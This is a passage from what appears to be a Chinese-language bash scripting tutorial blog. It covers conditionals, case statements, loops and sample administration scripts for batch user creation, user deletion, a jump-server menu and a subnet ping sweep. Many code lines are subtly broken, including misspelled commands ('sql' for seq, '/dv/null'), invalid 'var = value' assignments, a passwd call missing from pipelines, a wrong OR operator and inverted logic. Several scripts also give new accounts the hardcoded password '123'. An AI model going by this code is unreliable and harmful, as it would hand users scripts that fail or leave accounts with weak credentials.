class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">=</span><br><span class="line">==</span><br><span class="line">!=</span><br><span class="line">[ -n <span class="string">"hhh"</span> ]  <span class="comment"># 长度不是0</span></span><br><span class="line">[ -z <span class="string">"<span class="variable">$user</span>"</span> ]  <span class="comment"># 长度为0  (变量为空/未定义 =&gt; 都是0)</span></span><br><span class="line">-a     <span class="comment"># 并且    [1 -lt 1 -a 5 -gt 10]</span></span><br><span class="line">-r     <span class="comment"># 或者</span></span><br><span class="line">&amp;&amp;</span><br><span class="line">||</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="variable">$USER</span> != <span class="string">'root'</span> ];<span class="keyword">then</span>         <span class="comment"># $USER不等于root(字符串比较)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"你没有权限!"</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">apt install apache2</span><br></pre></td></tr></table></figure><p>例子：批量创建用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#尽量使用双引号引起来</span></span><br><span class="line"><span class="comment">#[ "$USER" = "root" ]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">##################################</span></span><br><span class="line"><span class="comment">#脚本规范 #</span></span><br><span class="line"><span class="comment">#useradd     #</span></span><br><span class="line"><span class="comment">#V1.0 by xps 01/03/2020     #</span></span><br><span class="line"><span class="comment">##################################</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"Please input number: "</span> num</span><br><span class="line"><span class="comment"># read -p "Please input 前缀: " prefix</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="comment"># 对用户输入进行过滤（数字） ^[0-9]+$  正则 =~ (模式串不能带双引号)</span></span><br><span class="line"><span class="comment">#if [[ ! "$num" =~ ^[0-9]+$ || "$num" =~ ^0+$ ]];then   # []单个方括号不支持正则，用[[ 变量 =~ 模式 ]]</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">"<span class="variable">$num</span>"</span> =~ ^[0-9]+$ ]];<span class="keyword">then</span>  </span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"不是数字，Please input number again: "</span> num</span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"Please input 前缀: "</span> prefix</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$prefix</span>"</span> ];<span class="keyword">then</span>   <span class="comment"># 如果长度为非0</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"Please input 前缀: "</span> prefix</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># man seq   打印序列： seq 1 2 10 (区间，步长)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `sql <span class="variable">$num</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">user=<span class="variable">$prefix</span><span class="variable">$i</span></span><br><span class="line">useradd <span class="variable">$user</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"123"</span> |passwd --stdin <span class="variable">$user</span>   <span class="comment"># --stdin 前面输出的当做标准输入</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$user</span> is created."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># declare 可以定义数据类型。但是一般不用，因为都是字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 语法不难，主要是对Linux系统以及命令的熟悉。</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># if后门紧跟的不一定是方括号，只要是能返回true/false的就行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ condition ]]; <span class="keyword">then</span></span><br><span class="line"><span class="comment">#statements</span></span><br><span class="line"><span class="keyword">elif</span> [[ condition ]]; <span class="keyword">then</span></span><br><span class="line"><span class="comment">#statements</span></span><br><span class="line"><span class="keyword">elif</span> [[ condition ]]; <span class="keyword">then</span></span><br><span class="line"><span class="comment">#statements</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h5 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h5><p>语法结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> 变量 <span class="keyword">in</span></span><br><span class="line">模式1)<span class="comment"># 都是字符串， 可以用通配符 (尽量使用双引号)</span></span><br><span class="line">命令序列1</span><br><span class="line">;;</span><br><span class="line">模式2)</span><br><span class="line">命令序列2</span><br><span class="line">;;</span><br><span class="line">模式3)</span><br><span class="line">命令序列3</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">无匹配后命令序列</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><p>例子1：删除用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> -p <span class="string">"请输入要删除的用户名： "</span> user</span><br><span class="line">id <span class="variable">$user</span> &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ &amp;? -ne 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"no suc user: <span class="variable">$user</span>"</span></span><br><span class="line"><span class="built_in">exit</span> 1<span class="comment"># 返回1（意思是错误退出）</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"你确定要删除用户: <span class="variable">$user</span> 吗 ?[y/n]: "</span> action</span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$action</span>"</span> <span class="keyword">in</span></span><br><span class="line">y|Y|yes|YES)</span><br><span class="line">userdel -r <span class="variable">$user</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"deleted user: <span class="variable">$user</span> success!"</span></span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"error"</span></span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><p>例子2： 判断一个东西是不是命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># command -v xxx</span></span><br><span class="line"><span class="comment"># echo $? 返回为0就是</span></span><br><span class="line"><span class="built_in">command</span> -v ls</span><br><span class="line"></span><br><span class="line">cmd1=/bin/date</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">command</span> -v <span class="variable">$cmd1</span> &amp;&gt;/dev/null;<span class="keyword">then</span></span><br><span class="line"><span class="comment"># 神马都不做： 只加一个冒号</span></span><br><span class="line">:</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$cmd1</span> 是一个命令"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>例子3：通过登录堡垒机/跳板机 jumpserver ，然后登录内网的服务器 （简易版）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 1.先登录到跳板机(普通账号)</span></span><br><span class="line"><span class="comment"># 2.跳板机登录到other server（）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录两次，有点麻烦</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 例子： 先登录到跳板机，再通过选项选择要登录到哪台服务器（1.密码认证 2.秘钥认证:以用户xps身份做 ssh-keygen, ssh-copy-id web1）</span></span><br><span class="line"><span class="comment"># 以xps身份登录上来， 秘钥登录服务器</span></span><br><span class="line"><span class="comment"># 脚本放到/home/xps/jumpserver.sh, 放到bashrc，登录这台机器就执行，并且禁止用户(^C)退出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">trap</span> <span class="string">""</span> HUP INT OUIT TSTP   <span class="comment"># 捕捉键盘信号，然后啥也不做(^C也退出不了) ,让他登录跳板机不能干别的</span></span><br><span class="line">web1=192.168.0.111</span><br><span class="line">web2=192.168.0.112</span><br><span class="line">web3=192.168.0.113</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;-EOF</span><br><span class="line">+---------------------------+</span><br><span class="line">|       1. web1       |</span><br><span class="line">|       2. web2             |</span><br><span class="line">|       3. mysql1           |</span><br><span class="line">+---------------------------+</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">"\e[1;32minput number:  \e[0m"</span>  <span class="comment"># 显示颜色, -n不换行</span></span><br><span class="line"><span class="built_in">read</span> num</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$num</span>"</span> <span class="keyword">in</span></span><br><span class="line">1)</span><br><span class="line">ssh xps@<span class="variable">$web1</span></span><br><span class="line">;;</span><br><span class="line">2)</span><br><span class="line">ssh xps@<span class="variable">$web2</span></span><br><span class="line">;;</span><br><span class="line">3)</span><br><span class="line">ssh xps@<span class="variable">$mysql1</span></span><br><span class="line">;;</span><br><span class="line"></span><br><span class="line"><span class="string">""</span>)</span><br><span class="line"><span class="comment"># 用户啥也没输入</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">*）</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"error"</span></span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 生产环境</span></span><br><span class="line"><span class="comment">#1. 业务服务器不允许直接连接，允许通过跳板机连接</span></span><br><span class="line"><span class="comment">#2. 业务服务器不允许root用户直接登录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 复杂版jumpserver(对用户行为进行行为/记录)  ---&gt; 使用Python脚本</span></span><br></pre></td></tr></table></figure><p>例子4：实现系统管理工具箱</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 实现系统管理工具箱</span></span><br><span class="line"><span class="comment"># 定义一个函数</span></span><br><span class="line">menu&#123;</span><br><span class="line">cat &lt;&lt;-EOF</span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"><span class="comment">#h. help     #</span></span><br><span class="line"><span class="comment">#f. disk partion     #</span></span><br><span class="line"><span class="comment">#d. filesystem mount #</span></span><br><span class="line"><span class="comment">#m. memory #</span></span><br><span class="line"><span class="comment">#u. system load #</span></span><br><span class="line"><span class="comment">#q .exit #</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line">EOF</span><br><span class="line">&#125;</span><br><span class="line">menu</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"Please input[h for help]: "</span> action</span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$action</span>"</span> <span class="keyword">in</span></span><br><span class="line">h)clear; menu;;</span><br><span class="line">f)fdisk -l;;</span><br><span class="line">d)df -Th;;</span><br><span class="line">m)free -m;;</span><br><span class="line">u)uptime;;</span><br><span class="line">q)<span class="built_in">break</span>;;</span><br><span class="line"><span class="string">""</span>) ;;</span><br><span class="line">*)<span class="built_in">echo</span> <span class="string">"error"</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"finish..."</span></span><br></pre></td></tr></table></figure><h5 id="各种符号"><a href="#各种符号" class="headerlink" title="各种符号"></a>各种符号</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">()    <span class="comment"># 在子shell中执行</span></span><br><span class="line">((1&lt;2))   <span class="comment"># C语言风格的比较</span></span><br><span class="line">$(date)           <span class="comment"># touch $(date +%F)_file.txt      先执行里面的命令再执行外面的</span></span><br><span class="line">$(())   <span class="comment"># 运算</span></span><br><span class="line"></span><br><span class="line">&#123;&#125;     <span class="comment"># 集合&#123;1..5&#125;</span></span><br><span class="line"><span class="variable">$&#123;&#125;</span>    <span class="comment"># 变量的引用</span></span><br><span class="line"></span><br><span class="line">[]     <span class="comment"># 条件测试           逻辑符号 [ a -a b  ]</span></span><br><span class="line">[[]]   <span class="comment"># 升级版的。  支持正则匹配 [[ =~ ]]， 逻辑符号 [[ a &amp;&amp; b ]]</span></span><br><span class="line"></span><br><span class="line">$[] <span class="comment"># 整数运算</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">####### 执行脚本</span></span><br><span class="line">./01.sh      <span class="comment"># 需要执行权限，在子shell中执行</span></span><br><span class="line">bash 01.sh   <span class="comment"># 不需要执行权限，在子shell中执行</span></span><br><span class="line"></span><br><span class="line">01.sh          <span class="comment"># 需要执行权限，在当前shell中执行</span></span><br><span class="line"><span class="built_in">source</span> 01.sh   <span class="comment"># 不需要执行权限，在当前shell中执行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###### 调试脚本</span></span><br><span class="line">sh -n 02.sh    <span class="comment"># 仅调试syntax error</span></span><br><span class="line">sh -vx 02.sh   <span class="comment"># 仅调试的方式执行，查询整个执行过程</span></span><br></pre></td></tr></table></figure><h4 id="四-循环"><a href="#四-循环" class="headerlink" title="四.循环"></a>四.循环</h4><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><blockquote><p>处理固定循环的时候，for有优势</p></blockquote><p>形式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> 变量名 [ <span class="keyword">in</span> 列表 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">循环体</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>拓展： 查看脚本运行时间:  <code>time ./a.sh</code></p><p>例子1： for循环ping机器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重定向</span></span><br><span class="line">&gt;ip.txt</span><br><span class="line"><span class="comment"># &#123;2..254&#125;  集合，  另一个序列: seq `2 254`</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;2..254&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = 192.168.111.<span class="variable">$i</span></span><br><span class="line">ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null   <span class="comment"># -W等待多少时间</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span>"</span> | tee -a ping.txt</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">&#125;&amp;    <span class="comment"># 用大括号和&amp;, 把整个循环【放到后台】</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">wait</span>    <span class="comment"># 等待前面的所有【后台】进程结束，再执行后面的</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"finish !"</span></span><br></pre></td></tr></table></figure><p>例子2：从文件中读取主机，然后ping</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#123;2..254&#125;  集合，  另一个序列: seq `2 254`</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> `cat ips.txt`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null   <span class="comment"># -W等待多少时间</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is up!"</span> </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is down!"</span> </span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">wait</span>    <span class="comment"># 等待前面的所有【后台】进程结束，再执行后门的</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"finish !"</span></span><br></pre></td></tr></table></figure><p>例子3：批量创建账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"input your prefix  &amp; passwd &amp; number : "</span> prefix passwd number</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"user information:</span></span><br><span class="line"><span class="string">---------------------------</span></span><br><span class="line"><span class="string">username: <span class="variable">$passwd</span></span></span><br><span class="line"><span class="string">prefix: <span class="variable">$prefix</span></span></span><br><span class="line"><span class="string">number: <span class="variable">$number</span></span></span><br><span class="line"><span class="string">---------------------------</span></span><br><span class="line"><span class="string">"</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"Are you sure?[y/n]"</span> action</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$action</span>"</span> = <span class="string">"y"</span> ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"continue ..."</span></span><br><span class="line"><span class="comment"># 然后是接下来的功能</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq -w  <span class="variable">$number</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">user = <span class="variable">$prefix</span>%i</span><br><span class="line">id <span class="variable">$user</span> &amp;&gt;/dv/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"user <span class="variable">$user</span> already exists"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">useradd <span class="variable">$user</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$passwd</span>"</span> | --stdin <span class="variable">$user</span>    <span class="comment"># 将密码作为标准输入</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$user</span> is created."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bash -n .sh     检查脚本错误</span></span><br></pre></td></tr></table></figure><p>例子4：批量创建账号（从文件中）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">passwd = 123</span><br><span class="line"><span class="comment"># 必须要输入文件</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"usage: `basename <span class="variable">$0</span>` file"</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># 判断输入的是否是文件</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="variable">$1</span> ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"error file"</span></span><br><span class="line"><span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># 开始(两列 -- &gt; 把密码和用户名分开)</span></span><br><span class="line"><span class="comment"># 应该：重新定义分隔符</span></span><br><span class="line"><span class="comment"># IFS内部字段分隔符,比如下面的回车</span></span><br><span class="line"><span class="comment"># IFS = $'\n'  </span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> `cat <span class="variable">$1</span>`  <span class="comment"># 位置变量 ,   for对空行不感冒</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="comment"># 长度为0就跳过</span></span><br><span class="line"><span class="keyword">if</span> $[ <span class="variable">$&#123;#line&#125;</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Nothing to do."</span></span><br><span class="line"><span class="built_in">continue</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">user = `<span class="built_in">echo</span> <span class="string">"<span class="variable">$line</span>"</span> |awk <span class="string">'print &amp;1'</span>`</span><br><span class="line">pass = `<span class="built_in">echo</span> <span class="string">"<span class="variable">$line</span>"</span> |awk <span class="string">'print &amp;2'</span>`</span><br><span class="line">id <span class="variable">$user</span> &amp;&gt;/dv/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"user <span class="variable">$user</span> already exists"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">useradd <span class="variable">$user</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$pass</span>"</span> | --stdin <span class="variable">$user</span> &amp;&gt;/dev/null    <span class="comment"># 将密码作为标准输入</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$user</span> is created."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>例子5：批量修改密码(剩下的功能自己完善)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 